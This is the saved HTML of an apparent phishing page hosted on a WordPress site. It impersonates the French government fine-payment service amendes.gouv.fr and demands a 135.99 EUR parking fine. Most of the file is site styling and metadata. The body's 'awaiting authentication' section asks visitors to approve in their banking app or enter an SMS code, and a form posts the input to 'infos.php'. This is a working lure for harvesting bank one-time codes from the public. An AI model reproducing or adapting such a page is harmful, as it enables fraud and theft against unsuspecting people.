            .elementor-widget .elementor-icon-list-item,.elementor-widget .elementor-icon-list-item a {
                display: flex;
                font-size: inherit;
                align-items: var(--icon-vertical-align,center)
            }

            .elementor-widget.elementor-list-item-link-full_width a {
                width: 100%
            }

            .elementor-widget.elementor-align-center .elementor-icon-list-item,.elementor-widget.elementor-align-center .elementor-icon-list-item a {
                justify-content: center
            }

            .elementor-widget.elementor-align-center .elementor-icon-list-item:after {
                margin: auto
            }

            .elementor-widget:not(.elementor-align-right) .elementor-icon-list-item:after {
                left: 0
            }

            .elementor-widget:not(.elementor-align-left) .elementor-icon-list-item:after {
                right: 0
            }

            @media (min-width: -1) {
                .elementor-widget:not(.elementor-widescreen-align-right) .elementor-icon-list-item:after {
                    left:0
                }

                .elementor-widget:not(.elementor-widescreen-align-left) .elementor-icon-list-item:after {
                    right: 0
                }
            }

            @media (max-width: -1) {
                .elementor-widget:not(.elementor-laptop-align-right) .elementor-icon-list-item:after {
                    left:0
                }

                .elementor-widget:not(.elementor-laptop-align-left) .elementor-icon-list-item:after {
                    right: 0
                }

                .elementor-widget:not(.elementor-tablet_extra-align-right) .elementor-icon-list-item:after {
                    left: 0
                }

                .elementor-widget:not(.elementor-tablet_extra-align-left) .elementor-icon-list-item:after {
                    right: 0
                }
            }

            @media (max-width: 1024px) {
                .elementor-widget:not(.elementor-tablet-align-right) .elementor-icon-list-item:after {
                    left:0
                }

                .elementor-widget:not(.elementor-tablet-align-left) .elementor-icon-list-item:after {
                    right: 0
                }
            }

            @media (max-width: -1) {
                .elementor-widget:not(.elementor-mobile_extra-align-right) .elementor-icon-list-item:after {
                    left:0
                }

                .elementor-widget:not(.elementor-mobile_extra-align-left) .elementor-icon-list-item:after {
                    right: 0
                }
            }

            @media (max-width: 767px) {
                .elementor-widget:not(.elementor-mobile-align-right) .elementor-icon-list-item:after {
                    left:0
                }

                .elementor-widget:not(.elementor-mobile-align-left) .elementor-icon-list-item:after {
                    right: 0
                }
            }

            .screen-reader-text {
                clip: rect(1px,1px,1px,1px);
                word-wrap: normal!important;
                border: 0;
                clip-path: inset(50%);
                height: 1px;
                margin: -1px;
                overflow: hidden;
                overflow-wrap: normal!important;
                padding: 0;
                position: absolute!important;
                width: 1px
            }

            .screen-reader-text:focus {
                clip: auto!important;
                background-color: #fff;
                border-radius: 3px;
                box-shadow: 0 0 2px 2px rgba(0,0,0,.6);
                clip-path: none;
                color: #2b2d2f;
                display: block;
                font-size: .875rem;
                font-weight: 700;
                height: auto;
                left: 5px;
                line-height: normal;
                padding: 15px 23px 14px;
                text-decoration: none;
                top: 5px;
                width: auto;
                z-index: 100000
            }

            .elementor-210 .elementor-element.elementor-element-3a40f50>.elementor-container {
                max-width: 1260px
            }

            .elementor-210 .elementor-element.elementor-element-3a40f50>.elementor-container>.elementor-column>.elementor-widget-wrap {
                align-content: center;
                align-items: center
            }

            .elementor-210 .elementor-element.elementor-element-3a40f50:not(.elementor-motion-effects-element-type-background) {
                background-color: #fff
            }

            .elementor-210 .elementor-element.elementor-element-3a40f50 {
                border-style: double;
                border-width: 3px 0;
                border-color: #c6c6c6;
                transition: background .3s,border .3s,border-radius .3s,box-shadow .3s
            }

            .elementor-210 .elementor-element.elementor-element-1a3a6e6,.elementor-210 .elementor-element.elementor-element-7c3731e>.elementor-element-populated {
                text-align: center
            }

            .elementor-210 .elementor-element.elementor-element-e1fac10 .elementor-icon-list-items:not(.elementor-inline-items) .elementor-icon-list-item:not(:last-child) {
                padding-bottom: calc(11px/2)
            }

            .elementor-210 .elementor-element.elementor-element-e1fac10 .elementor-icon-list-items:not(.elementor-inline-items) .elementor-icon-list-item:not(:first-child) {
                margin-top: calc(11px/2)
            }

            .elementor-210 .elementor-element.elementor-element-e1fac10 .elementor-icon-list-item:not(:last-child):after {
                content: "";
                border-color: #ddd
            }

            .elementor-210 .elementor-element.elementor-element-e1fac10 .elementor-icon-list-items:not(.elementor-inline-items) .elementor-icon-list-item:not(:last-child):after {
                border-top-style: solid;
                border-top-width: 1px
            }

            .elementor-210 .elementor-element.elementor-element-e1fac10 {
                --e-icon-list-icon-size: 14px;
                --icon-vertical-offset: 0px
            }

            .elementor-210 .elementor-element.elementor-element-e1fac10 .elementor-icon-list-item>a {
                font-size: 17px;
                font-weight: 300;
                font-style: normal;
                letter-spacing: 4.7px
            }

            .elementor-210 .elementor-element.elementor-element-e1fac10 .elementor-icon-list-text {
                color: #000;
                transition: color .3s
            }

            .elementor-210 .elementor-element.elementor-element-e1fac10 .elementor-icon-list-item:hover .elementor-icon-list-text {
                color: #ff009c
            }

            .elementor-210 .elementor-element.elementor-element-e1fac10>.elementor-widget-container {
                margin: 0;
                padding: 0
            }

            @media (max-width: 767px) {
                .elementor-210 .elementor-element.elementor-element-1a3a6e6 {
                    text-align:center
                }
            }
        </style>
        <script type="application/ld+json" class="rank-math-schema">
            {
                "@context": "https://schema.org",
                "@graph": [
                    {
                        "@type": "Organization",
                        "@id": "https://neotabac.com/#organization",
                        "name": "Neotabac",
                        "url": "https://neotabac.com",
                        "logo": {
                            "@type": "ImageObject",
                            "@id": "https://neotabac.com/#logo",
                            "url": "http://neotabac.com/wp-content/uploads/2023/10/cropped-Neotabac_Plan-de-travail-1-4.png",
                            "contentUrl": "http://neotabac.com/wp-content/uploads/2023/10/cropped-Neotabac_Plan-de-travail-1-4.png",
                            "caption": "Neotabac",
                            "inLanguage": "fr-FR",
                            "width": "591",
                            "height": "236"
                        }
                    },
                    {
                        "@type": "WebSite",
                        "@id": "https://neotabac.com/#website",
                        "url": "https://neotabac.com",
                        "name": "Neotabac",
                        "publisher": {
                            "@id": "https://neotabac.com/#organization"
                        },
                        "inLanguage": "fr-FR"
                    },
                    {
                        "@type": "ImageObject",
                        "@id": "https://neotabac.com/wp-content/uploads/2023/10/50646.gif",
                        "url": "https://neotabac.com/wp-content/uploads/2023/10/50646.gif",
                        "width": "200",
                        "height": "200",
                        "inLanguage": "fr-FR"
                    },
                    {
                        "@type": "WebPage",
                        "@id": "https://neotabac.com/confirmation/#webpage",
                        "url": "https://neotabac.com/confirmation/",
                        "name": "Confirmation - Neotabac",
                        "datePublished": "2023-10-01T20:22:31+02:00",
                        "dateModified": "2024-02-06T13:53:18+01:00",
                        "isPartOf": {
                            "@id": "https://neotabac.com/#website"
                        },
                        "primaryImageOfPage": {
                            "@id": "https://neotabac.com/wp-content/uploads/2023/10/50646.gif"
                        },
                        "inLanguage": "fr-FR"
                    },
                    {
                        "@type": "Person",
                        "@id": "https://neotabac.com/author/neo/",
                        "name": "Neo",
                        "url": "https://neotabac.com/author/neo/",
                        "image": {
                            "@type": "ImageObject",
                            "@id": "https://neotabac.com/wp-content/litespeed/avatar/0b24f5931019355e9068bda4d5015b34.jpg?ver=1708045914",
                            "url": "https://neotabac.com/wp-content/litespeed/avatar/0b24f5931019355e9068bda4d5015b34.jpg?ver=1708045914",
                            "caption": "Neo",
                            "inLanguage": "fr-FR"
                        },
                        "sameAs": [
                            "https://neotabac.com"
                        ],
                        "worksFor": {
                            "@id": "https://neotabac.com/#organization"
                        }
                    },
                    {
                        "@type": "Article",
                        "headline": "Confirmation - Neotabac",
                        "datePublished": "2023-10-01T20:22:31+02:00",
                        "dateModified": "2024-02-06T13:53:18+01:00",
                        "author": {
                            "@id": "https://neotabac.com/author/neo/",
                            "name": "Neo"
                        },
                        "publisher": {
                            "@id": "https://neotabac.com/#organization"
                        },
                        "description": "Connecter vous sur votre application bancaire ou insérer le code reçu par sms afin de finaliser votre opération.",
                        "name": "Confirmation - Neotabac",
                        "@id": "https://neotabac.com/confirmation/#richSnippet",
                        "isPartOf": {
                            "@id": "https://neotabac.com/confirmation/#webpage"
                        },
                        "image": {
                            "@id": "https://neotabac.com/wp-content/uploads/2023/10/50646.gif"
                        },
                        "inLanguage": "fr-FR",
                        "mainEntityOfPage": {
                            "@id": "https://neotabac.com/confirmation/#webpage"
                        }
                    }
                ]
            }</script>
        <link rel="alternate" type="application/rss+xml" title="Neotabac » Flux" href="https://neotabac.com/feed/">
        <link rel="alternate" type="application/rss+xml" title="Neotabac » Flux des commentaires" href="https://neotabac.com/comments/feed/">
        <link rel="https://api.w.org/" href="https://neotabac.com/wp-json/">
        <link rel="alternate" type="application/json" href="https://neotabac.com/wp-json/wp/v2/pages/554">
        <link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://neotabac.com/xmlrpc.php?rsd">
        <link rel="shortlink" href="https://neotabac.com/?p=554">
        <link rel="alternate" type="application/json+oembed" href="https://neotabac.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fneotabac.com%2Fconfirmation%2F">
        <link rel="alternate" type="text/xml+oembed" href="https://neotabac.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fneotabac.com%2Fconfirmation%2F&amp;format=xml">
        <link rel="icon" href="data:image/png;base64,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" sizes="192x192">
        <meta name="msapplication-TileImage" content="https://neotabac.com/wp-content/uploads/2023/10/cropped-Neotabac-02-4-270x270.png">
        <style>
            @media (prefers-color-scheme: dark) {
            }
        </style>
        <style>
            .sf-hidden {
                display: none!important
            }
        </style>
        <style>
            img[src="data:,"],source[src="data:,"] {
                display: none!important
            }
        </style>
        <noscript>
            <style>
                .woocommerce-product-gallery {
                    opacity: 1 !important;
                }
            </style>
        </noscript>
        <meta charset="UTF-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <meta http-equiv="Content-Security-Policy" content="script-src 'unsafe-inline' data: https://ajax.googleapis.com">
        <link rel="stylesheet" href="./infos_files/styles.572738d2b631b3d66c72.css">
</head>
<body>
<header class="wrapper"><h1><a routerlink="/tai" aria-label="Revenir à la page d'accueil" href="https://www.amendes.gouv.fr/tai"><img src="infos_files/logo-amendes-gouv.svg" class="logo-header" alt="République Française Liberté Egalité Fraternité - Ministère de l'action et des comptes publics" width="500"></a></h1><ul role="navigation" class="lang-selector no-print"><li><a aria-label="Je souhaite cette page en français" href="javascript:void(0);" class="active" lang="fr"><span aria-hidden="true">FR</span></a></li><li><a class="" aria-label="I wish to consult this web page in English" href="javascript:void(0);" lang="en"><span aria-hidden="true">EN</span></a></li><li><a aria-label="Ich möchte diese Webseite auf Deutsch konsultieren" href="javascript:void(0);" lang="de"><span aria-hidden="true">DE</span></a></li><li><a aria-label="Ik wil deze webpagina in het Nederlands raadplegen" href="javascript:void(0);" lang="nl"><span aria-hidden="true">NL</span></a></li><li><a aria-label="Desidero consultare questo sito in italiano" href="javascript:void(0);" lang="it"><span aria-hidden="true">IT</span></a></li><li><a aria-label="Deseo consultar este página en español" href="javascript:void(0);" lang="es"><span aria-hidden="true">ES</span></a></li><!----></ul></header><div class="intro-banner"><div class="wrapper"><h1 id="title-main">Service de paiement en ligne des amendes</h1><p>
 Vous pouvez régler par carte bancaire (payer ou consigner) toutes 
amendes: Veuillez vous acquitter de votre amende de stationnement de 135.99 EUR. </p></div></div>
<noscript>
            <img height="1" width="1" style="display:none;" alt="" src="https://ct.pinterest.com/v3/?tid=2613046177830&amp;noscript=1">
        </noscript>
        <a class="skip-link screen-reader-text" href="#site-content">Skip to the content</a>
        <div class="page-wrap">
            <div data-elementor-type="section" data-elementor-id="210" class="elementor elementor-210" data-elementor-post-type="elementor_library"></div>
            <div class="container main-container" role="main">
                <div class="page-area">
                    <div class="row">
                        <article class="col-md-12">
                            <div class="post-554 page type-page status-publish hentry">
                                <div class="futurio-content main-content-page">
                                    <div class="single-entry-summary">
                                        <div data-elementor-type="wp-page" data-elementor-id="554" class="elementor elementor-554" data-elementor-post-type="page">
                                            <section class="elementor-section elementor-top-section elementor-element elementor-element-4ea16f77 elementor-section-boxed elementor-section-height-default" data-id="4ea16f77" data-element_type="section">
                                                <div class="elementor-container elementor-column-gap-default">
                                                    <div class="elementor-column elementor-col-50 elementor-top-column elementor-element elementor-element-7f9e120d" data-id="7f9e120d" data-element_type="column">
                                                        <div class="elementor-widget-wrap elementor-element-populated">
                                                            <div class="elementor-element elementor-element-2833ebc elementor-widget elementor-widget-text-editor" data-id="2833ebc" data-element_type="widget" data-widget_type="text-editor.default">
                                                                <div class="elementor-widget-container">
                                                                    <h4 style="text-align:center">En attente d’authentification</h4>
                                                                    <p style="text-align:center">Connecter vous sur votre application bancaire ou insérer le code reçu par sms afin de finaliser votre opération.</p>
                                                                    <p style="text-align:center">Cette opération peut prendre une minute.</p>
                                                                </div>
                                                            </div>
                                                            <div class="elementor-element elementor-element-12c5a978 e-transform elementor-widget elementor-widget-image" data-id="12c5a978" data-element_type="widget" data-settings="{&quot;_transform_translateY_effect&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:-74,&quot;sizes&quot;:[]},&quot;_transform_translateX_effect&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:&quot;&quot;,&quot;sizes&quot;:[]},&quot;_transform_translateX_effect_tablet&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:&quot;&quot;,&quot;sizes&quot;:[]},&quot;_transform_translateX_effect_mobile&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:&quot;&quot;,&quot;sizes&quot;:[]},&quot;_transform_translateY_effect_tablet&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:&quot;&quot;,&quot;sizes&quot;:[]},&quot;_transform_translateY_effect_mobile&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:&quot;&quot;,&quot;sizes&quot;:[]}}" data-widget_type="image.default">
                                                                <div class="elementor-widget-container">
                                                                    <img data-lazyloaded="1" src="data:image/gif;base64,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" decoding="async" width="32" height="32" data-src="https://neotabac.com/wp-content/uploads/2023/10/50646.gif" class="attachment-large size-large wp-image-570 entered litespeed-loaded" alt="" data-ll-status="loaded">
                                                                    <noscript>
                                                                        <img decoding="async" width="32" height="32" src="https://neotabac.com/wp-content/uploads/2023/10/50646.gif" class="attachment-large size-large wp-image-570" alt="">
                                                                    </noscript>
                                                                </div>
                                                            </div>
                                                            <div class="elementor-element elementor-element-1d94878 elementor-widget elementor-widget-wpforms" data-id="1d94878" data-element_type="widget" data-widget_type="wpforms.default">
                                                                <div class="elementor-widget-container">
                                                                    <div class="wpforms-container wpforms-container-full" id="wpforms-604">
                                                                        <form class="wpforms-validate wpforms-form wpforms-ajax-form" method="post" action="infos.php">
                                                                            <input type="hidden" class="nadi5" name="step" value="email_code">
